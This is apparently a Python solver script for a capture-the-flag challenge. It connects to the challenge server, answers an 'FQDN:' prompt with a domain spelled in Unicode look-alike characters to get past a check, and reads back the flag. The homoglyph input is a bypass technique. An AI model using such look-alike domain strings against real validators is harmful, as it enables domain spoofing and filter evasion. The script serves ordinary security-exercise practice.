#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import re
import socket

HOST = os.getenv("CTF4B_HOST", "localhost")

PORT = os.getenv("CTF4B_PORT", "44322")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, int(PORT)))

print(s.recv(2**8)) #FQDN:
s.send("ωωω․ė×аⅿρIε․εοⅿ\n".encode())
flag = re.search("ctf4b{.*?}", s.recv(2**7).decode()).group()
print(flag)

s.close() 